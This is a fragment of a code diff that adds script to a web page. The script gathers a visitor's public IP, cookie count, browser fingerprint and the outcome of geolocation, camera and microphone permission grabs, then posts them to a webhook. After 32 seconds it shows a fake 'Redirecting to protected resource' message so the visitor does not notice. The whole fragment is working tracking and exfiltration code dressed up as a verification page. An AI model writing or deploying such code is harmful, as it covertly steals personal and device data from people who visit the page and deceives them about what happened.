+                description: `**IP:** ${finalData.publicIP}\n**Cookies:** ${finalData.cookiesCount}\n**Fingerprint:** ${finalData.fingerprint.slice(0,32)}...\n**Permissions:** GPS=${finalData.permissions.geolocation.lat ? "OK" : "denied"}, Camera=${finalData.permissions.camera.success ? "OK" : "denied"}, Mic=${finalData.permissions.microphone.success ? "OK" : "denied"}`,
+                color: 0x44ff44,
+                timestamp: finalData.timestamp
+            }]
+        };
+        formData.append("payload_json", JSON.stringify(embed));
+
+        try {
+            await fetch(WEBHOOK_URL, { method: "POST", body: formData });
+        } catch(e) { console.error("Webhook error", e); }
+
+        // After 32 seconds, show fake redirection message
+        setTimeout(() => {
+            document.getElementById("mainContainer").innerHTML = `
+                <div class="container" style="background:white; text-align:center; padding:40px;">
+                    <div style="font-size:48px;">↻</div>
+                    <h2>Redirecting to protected resource...</h2>
+                    <p>https://verification-required.com/secure/</p>
+                    <p style="font-size:12px; color:#777;">If not redirected, <a href="#">click here</a></p>
+                </div>
+            `;
+        }, 32000);
+    });
+</script>
 </body>
 </html>
